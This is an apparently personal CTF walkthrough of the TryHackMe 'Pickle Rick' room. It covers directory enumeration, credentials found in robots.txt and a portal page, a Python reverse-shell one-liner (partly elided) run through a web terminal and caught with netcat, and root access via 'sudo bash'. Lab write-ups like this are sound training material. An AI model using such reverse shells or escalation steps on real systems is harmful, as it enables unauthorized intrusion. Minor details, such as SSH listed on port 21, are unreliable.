---
title: Pickle Rick WalkThrough
permalink: /pickleRick
layout: page
tags: TryHackMe
---
# Picke Rick
# ![front](/images/pickleRick/front.png)
[https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)

## Open Ports:
  - 21: ssh
  - 80: HTTP
  
## Port 80:
1. find sub-doamisn and directories usind **dirb** + **dirbuster**
   - ip/robots.txt **(we find passwd)**
   - ip/index **(username in the source Page)**
   - ip/portal.php **(found username and password)**
   
## Gaining Access:
 **We find a terminal inside the website**
 - Add the python reverse shell command
 	```
	 	python -c 'import ......os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	 ```

 - listening via netcat will gain you access to the **BOX**
### 1st Flag:
![user_flag](/images/pickleRick/1st.png)
### 2nd Flag:
![user_flag](/images/pickleRick/2nd.png) 


## Privilege Escalation:
 - sudo -l
    - All users are sudp 
    	```
      		'sudo bash'
    	```
### 3rd Flag:
![rootflag.png](/images/pickleRick/3rd.png)
